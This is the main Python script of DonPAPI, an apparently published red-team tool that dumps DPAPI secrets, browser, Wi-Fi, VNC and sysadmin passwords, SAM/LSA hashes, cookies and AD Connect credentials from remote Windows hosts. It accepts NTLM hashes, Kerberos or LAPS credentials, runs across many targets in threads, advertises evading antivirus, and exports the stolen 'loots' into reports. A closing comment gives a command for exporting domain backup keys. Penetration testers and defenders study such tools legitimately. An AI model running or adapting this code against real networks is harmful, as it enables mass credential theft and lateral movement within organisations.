#!/usr/bin/env python
# coding:utf-8
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: Dump DPAPI secrets remotely
#
# Author:
#  PA Vandewoestyne
#  Credits :
#  Alberto Solino (@agsolino)
#  Benjamin Delpy (@gentilkiwi) for most of the DPAPI research (always greatly commented - <3 your code)
#  Alesandro Z (@) & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur.
#  dirkjanm @dirkjanm for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. i learned so much on so many subjects thanks to you. <3
#  @Byt3bl3d33r for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
#  All the Team of @LoginSecurite for their help in debugging my shity code (special thanks to @layno & @HackAndDo for that)

import argparse
import json
import logging
import os
import re
import sqlite3
import sys
import concurrent.futures
from donpapi.myseatbelt import MySeatBelt
from donpapi.database import Database
from donpapi.reporting import Reporting
from donpapi.lib.toolbox import split_targets

global assets
assets={}

BANNER = """
                                                                                
         ,                                                                      
       ,                                                 LeHack Release! \U0001F480                       
        (                                                                       
       .                                          by Touf & Zblurx @ Login Sécurité                       
                                &&&&&&                                                             
     &&&&&%%%.                  &&&&&&                                          
      &&&&%%%              &&&& &&&&&&       &&&&&&            &&&&&.           
      &&&&%%%           &&&&&&& &&&&&&    &&&&&&&&&&&&&     &&&&&&&&&&&         
      &&&&%%%         &&&&&&&&& &&&&&&  &&&&&&&&&&&&&&&&   &&&&&&&&&&&&&        
    &&&&&&%%%%%       &&&&&&    &&&&&&  &&&&&&    &&&&&&   &&&&&   &&&&&   #####  
 &&&&&&&&&%%%%%%%     &&&&&&&&&&&&&&&&  (&&&&&&&&&&&&&&&   &&&&&   &&&&&   # # #
 &/&/////////////%      &&&&&&&&&&&&      &&&&&&&&&&&&     &&&&&   &&&&&   #####
&&/&/#////////(//%         &&&&&&            &&&&&&        &&&&&   &&&&&    ###
&&/&/////////////%        
&&/&/////////////%        &&&&&&&&&        &&&&&&&&&&        &&&&&&&&&     &&&&&
&&/&//////////(//%     &&&&&&&&&&&&&&    &&&&&&&&&&&&&&   &&&&&&&&&&&&&&   &&&&&
&&/&/////////////%     &&&&&&   &&&&&&  &&&&&&   &&&&&&&  &&&&&&   &&&&&&  &&&&&
&&/&///////////(/%    &&&&&&    &&&&&&  &&&&&&    &&&&&& &&&&&&    &&&&&&  &&&&&
&&/&///(/////////%    &&&&&& &&&&&&&&&  &&&&&&&&& &&&&&& &&&&&& &&&&&&&&&  &&&&&
&&/&/////////////%    &&&&&& &&&&&&&      &&&&&&& &&&&&& &&&&&& &&&&&&&    &&&&&
&&#&###########/#%    &&&&&&                             &&&&&&                 
&&###############%    &&&&&&                             &&&&&&                
"""

def main():
    global assets
    print(BANNER)
    parser = argparse.ArgumentParser(add_help = True, description = "Dump revelant information on compromised targets without AV detection.")

    parser.add_argument('target', nargs='?', action='store', help='[[domain/]username[:password]@]<targetName or address>',default='')
    parser.add_argument('-credz', action='store', help='File containing multiple user:password or user:hash for masterkeys decryption')
    parser.add_argument('-pvk', action='store', help='input backupkey pvk file')
    parser.add_argument('-d','--debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t',  default='30', metavar="number of threads",  help='number of threads')
    parser.add_argument('-o', '--output_directory', default='./', help='output log directory')

    group = parser.add_argument_group('authentication')
    group.add_argument('-H','--hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (1128 or 256 bits)')
    group.add_argument('-local_auth', action="store_true",   help='use local authentification', default=False)
    group.add_argument('-laps', action="store_true", help='use LAPS to request local admin password', default=False)


    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar="ip address",  help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",   help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port", help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('Reporting')
    group.add_argument('-R', '--report', action="store_true", help='Only Generate Report on the scope', default=False)
    group.add_argument('--type', action="store", help='only report "type" password (wifi,credential-blob,browser-internet_explorer,LSA,SAM,taskscheduler,VNC,browser-chrome,browser-firefox')
    group.add_argument('-u','--user', action="store_true", help='only this username')
    group.add_argument('--target', action="store_true", help='only this target (url/IP...)')

    group = parser.add_argument_group('attacks')
    group.add_argument('--no_browser', action="store_true", help='do not hunt for browser passwords', default=False)
    group.add_argument('--no_dpapi', action="store_true", help='do not hunt for DPAPI secrets', default=False)
    group.add_argument('--no_vnc', action="store_true", help='do not hunt for VNC passwords', default=False)
    group.add_argument('--no_remoteops', action="store_true", help='do not hunt for SAM and LSA with remoteops', default=False)
    group.add_argument('--GetHashes', action="store_true", help="Get all users Masterkey's hash & DCC2 hash", default=False)
    group.add_argument('--no_recent', action="store_true", help="Do not hunt for recent files", default=False)
    group.add_argument('--no_sysadmins', action="store_true", help="Do not hunt for sysadmins stuff (mRemoteNG, vnc, keepass, lastpass ...)", default=False)
    group.add_argument('--from_file', action='store', help='Give me the export of ADSyncQuery.exe ADSync.mdf to decrypt ADConnect password', default='adsync_export')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    #logging.basicConfig(filename='debug.log', level=logging.DEBUG)

    if options.debug is True:
        logging.basicConfig(format='%(asctime)s.%(msecs)03d %(levelname)s {%(module)s} [%(funcName)s] %(message)s',
                            datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
                            handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.basicConfig(format='%(levelname)s %(message)s',
                            datefmt='%Y-%m-%d,%H:%M:%S', level=logging.DEBUG,
                            handlers=[logging.FileHandler("debug.log"), logging.StreamHandler()])
        logging.getLogger().setLevel(logging.INFO)

    options.domain, options.username, options.password, options.address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    #Load Configuration and add them to the options
    load_configs(options)
    #init database?
    first_run(options)
    #

    if options.report is not None and options.report!=False:
        options.report = True
    #In case the password contains '@'
    if '@' in options.address:
        options.password = options.password + '@' + options.address.rpartition('@')[0]
        options.address = options.address.rpartition('@')[2]

    options.username=options.username.lower() #for easier compare

    if options.target_ip is None:
        options.target_ip = options.address
    if options.domain is None:
        options.domain = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        options.password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    if options.hashes is not None:
        if ':' in options.hashes:
            options.lmhash, options.nthash = options.hashes.split(':')
        else:
            options.lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            options.nthash = options.hashes
    else:
        options.lmhash = ''
        options.nthash = ''
    credz={}
    if options.credz is not None:
        if os.path.isfile(options.credz):
            with open(options.credz, 'rb') as f:
                file_data = f.read().replace(b'\x0d', b'').split(b'\n')
                for cred in file_data:
                    if b':' in cred:
                        tmp_split = cred.split(b':')
                        tmp_username = tmp_split[0].lower() #Make all usernames lower for easier compare
                        tmp_password = b''.join(tmp_split[1:])
                        #Add "history password to account pass to test
                        if b'_history' in tmp_username:
                            tmp_username=tmp_username[:tmp_username.index(b'_history')]
                        if tmp_username.decode('utf-8') not in credz:
                            credz[tmp_username.decode('utf-8')] = [tmp_password.decode('utf-8')]
                        else:
                            credz[tmp_username.decode('utf-8')].append(tmp_password.decode('utf-8'))
            logging.info(f'Loaded {len(credz)} user credentials')

        else:
            logging.error(f"[!]Credential file {options.credz} not found")
    #Also adding submited credz
    if options.username not in credz:
        if options.password!='':
            credz[options.username] = [options.password]
        if options.nthash!='':
            credz[options.username] = [options.nthash]
    else:
        if options.password!='':
            credz[options.username].append(options.password)
        if options.nthash!='':
            credz[options.username].append(options.nthash)
    options.credz=credz

    targets = split_targets(options.target_ip)
    logging.info("Loaded {i} targets".format(i=len(targets)))
    if len(targets) > 0 :
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=int(options.t)) as executor:
                executor.map(seatbelt_thread, [(target, options, logging.getLogger()) for target in targets])
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
        #print("ENDING MAIN")


    if options.report :
        try:
            my_report = Reporting(sqlite3.connect(options.db_path), logging, options, targets)

            # Splited reports
            my_report.generate_report(report_name='client_view',
                                      report_content=['credz', 'hash_reuse'],
                                      credz_content=['taskscheduler', 'LSA'])
            my_report.generate_report(report_name='most_important_credentials',
                                      report_content=['credz'],
                                      credz_content=['wifi', 'taskscheduler', 'credential-blob',
                                                     'browser', 'sysadmin', 'LSA'])
            my_report.generate_report(report_name='cookies',
                                      report_content=['cookies'],
                                      credz_content=[''])
            # Main report
            my_report.generate_report(report_name='full_report')

            logging.info("[+] Exporting loots to raw files : credz, sam, cookies")
            my_report.export_credz()
            my_report.export_sam()
            my_report.export_cookies()
            if options.GetHashes:
                my_report.export_mkf_hashes()
                my_report.export_dcc2_hashes()
        except Exception as e:
            logging.error(str(e))

def load_configs(options):
    seatbelt_path = os.path.dirname(os.path.realpath(__file__))
    config_file=os.path.join(os.path.join(seatbelt_path,"config"),"donpapi_config.json")
    with open(config_file,'rb') as config:
        config_parser = json.load(config)
        options.db_path=config_parser['db_path']
        options.db_name = config_parser['db_name']
        options.workspace=config_parser['workspace']

def first_run(options):
    #Create directory if needed
    if not os.path.exists(options.output_directory) :
        os.mkdir(options.output_directory)
    db_path=os.path.join(options.output_directory,options.db_name)
    logging.debug(f"Database file = {db_path}")
    options.db_path = db_path
    if not os.path.exists(options.db_path):
        logging.info(f'Initializing database {options.db_path}')
        conn = sqlite3.connect(options.db_path,check_same_thread=False)
        c = conn.cursor()
        # try to prevent some of the weird sqlite I/O errors
        c.execute('PRAGMA journal_mode = OFF')
        c.execute('PRAGMA foreign_keys = 1')
        Database(conn, logging).db_schema(c)
        #getattr(protocol_object, 'database').db_schema(c)
        # commit the changes and close everything off
        conn.commit()
        conn.close()

def seatbelt_thread(datas):
    global assets
    target,options, logger=datas
    logging.debug("[*] SeatBelt thread for {ip} Started".format(ip=target))

    try:
        mysb = MySeatBelt(target,options,logger)
        if mysb.admin_privs:
            mysb.do_test()
            # mysb.run()
            #mysb.quit()
        else:
            logging.debug("[*] No ADMIN account on target {ip}".format(ip=target))

        #assets[target] = mysb.get_secrets()
        logging.debug("[*] SeatBelt thread for {ip} Ended".format(ip=target))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))


def export_results_seatbelt(output_dir=''):
    global assets
    users={}
    logging.info(f"[+] Gathered infos from {len(assets)} targets")
    f = open(os.path.join(output_dir, f'SeatBelt_secrets_all.log'), 'wb')
    for machine_ip in assets:
        for user in assets[machine_ip]:
            if user not in users:
                users[user]=[]
            for secret in assets[machine_ip][user]:
                f.write(f"[{machine_ip}//{user}] {assets[machine_ip][user][secret]}\n".encode('utf-8'))
                if assets[machine_ip][user][secret] not in users[user]:
                    users[user].append(assets[machine_ip][user][secret])
    #
    f.close()
    f = open(os.path.join(output_dir, f'SeatBelt_secrets.log'), 'wb')
    for user in users:
        for secret in users[user][secret]:
            f.write(f"[{user}]\n{users[user][secret]}\n".encode('utf-8'))
    f.close()

if __name__ == "__main__":
    main()
    #GetDomainBackupKey : dpapi.py backupkeys credz@DC.local --export

